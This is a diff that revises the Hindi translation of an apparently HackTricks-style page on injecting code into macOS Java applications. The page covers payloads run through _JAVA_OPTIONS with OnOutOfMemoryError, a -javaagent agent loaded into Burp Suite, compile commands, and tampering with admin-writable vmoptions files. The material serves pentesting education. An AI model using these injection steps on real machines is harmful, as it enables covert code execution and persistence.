@@ -4,7 +4,7 @@
 
 ## Enumeration
 
-अपने system में installed Java applications खोजें। यह देखा गया है कि **Info.plist** में Java apps में कुछ Java parameters होते हैं, जिनमें **`java.`** string शामिल होती है, इसलिए आप इसे search कर सकते हैं:
+अपने system में installed Java applications खोजें। यह देखा गया है कि **Info.plist** में Java apps में कुछ Java parameters होते हैं, जिनमें **`java.`** string शामिल होती है, इसलिए आप इसे खोज सकते हैं:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,7 +14,7 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-env variable **`_JAVA_OPTIONS`** का उपयोग किसी java compiled app के execution में arbitrary java parameters inject करने के लिए किया जा सकता है:
+Environment variable **`_JAVA_OPTIONS`** का उपयोग Java application शुरू होने पर मनमाने Java VM parameters inject करने के लिए किया जा सकता है।<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-हालांकि, इससे executed app पर एक error trigger होगा; एक और अधिक stealth तरीका java agent बनाना और इसका उपयोग करना है:
+हालाँकि, वह technique executed application में एक error trigger करती है। एक अधिक stealthy alternative Java agent create करना और `-javaagent` का उपयोग करना है:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Application से **different Java version** के साथ agent बनाने पर agent और application दोनों का execution crash हो सकता है
+> Application से **different Java version** के साथ agent बनाने पर agent और application दोनों crash हो सकते हैं।
 
-जहाँ agent हो सकता है:
+Agent यहां हो सकता है:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Agent को compile करने के लिए चलाएँ:
+Agent compile करने के लिए चलाएँ:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions file
+## vmoptions फ़ाइल
 
-यह file Java के execute होने पर **Java params** की specification support करती है। आप Java params को बदलने और **process से arbitrary commands execute करवाने** के लिए पिछले कुछ tricks का उपयोग कर सकते हैं।\
-इसके अलावा, यह file `include` directory के साथ अन्य files को भी **include** कर सकती है, इसलिए आप किसी included file को भी बदल सकते हैं।
+यह फ़ाइल Java को execute किए जाने पर **Java parameters** निर्दिष्ट करने की सुविधा देती है। आप Java parameters को बदलने और **process से arbitrary commands execute करवाने** के लिए पिछली कुछ techniques का उपयोग कर सकते हैं।\
+इसके अलावा, यह फ़ाइल `include` directive के साथ **अन्य फ़ाइलों को भी शामिल** कर सकती है, इसलिए आप शामिल की गई फ़ाइल को भी बदल सकते हैं।
 
-इससे भी आगे, कुछ Java apps एक से अधिक `vmoptions` files **load** करेंगी।
+इससे भी अधिक, कुछ Java apps **एक से अधिक `vmoptions`** फ़ाइलें **load** करेंगी।
 
-Android Studio जैसे कुछ applications अपने **output में यह indicate करते हैं कि वे इन files को कहां ढूंढ रहे हैं**, जैसे:
+Android Studio जैसे कुछ applications अपने **output में यह बताते हैं कि वे इन फ़ाइलों को कहाँ खोजते हैं**:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Android Studio जैसे कुछ applications अपने **output मे�
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-यदि वे ऐसा नहीं करते हैं, तो आप इसे आसानी से इस तरह जांच सकते हैं:
+यदि वे ऐसा नहीं करते हैं, तो आप इसे इससे जाँच सकते हैं:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-ध्यान दें कि इस उदाहरण में Android Studio **`/Applications/Android Studio.app.vmoptions`** फ़ाइल को load करने का प्रयास कर रहा है, ऐसी जगह जहाँ **`admin` group का कोई भी user write access रखता है।**
+ध्यान दें कि इस उदाहरण में Android Studio **`/Applications/Android Studio.app.vmoptions`** को load करने का प्रयास करता है, ऐसी location जहाँ **`admin` group का कोई भी user write access रखता है**।
 
+## References
+
+- [1] [OpenJDK — `arguments.cpp` में `_JAVA_OPTIONS` parsing](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — `java.lang.instrument` package specification](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — JVM options और platform properties configure करना](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
